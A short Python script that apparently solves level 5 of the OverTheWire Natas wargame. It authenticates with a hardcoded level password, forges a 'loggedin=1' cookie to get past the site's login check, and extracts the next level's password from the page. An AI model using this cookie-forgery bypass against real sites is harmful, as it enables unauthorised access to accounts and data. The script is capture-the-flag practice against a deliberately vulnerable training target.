import requests
import re

username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

url = 'http://%s.natas.labs.overthewire.org' % username

cookie = {'loggedin': '1'}

session = requests.Session()

response = session.get(url, auth=(username, password), cookies=cookie)

content = response.text

flag = re.findall('The password for natas6 is (.*)', content)[0]

print(flag)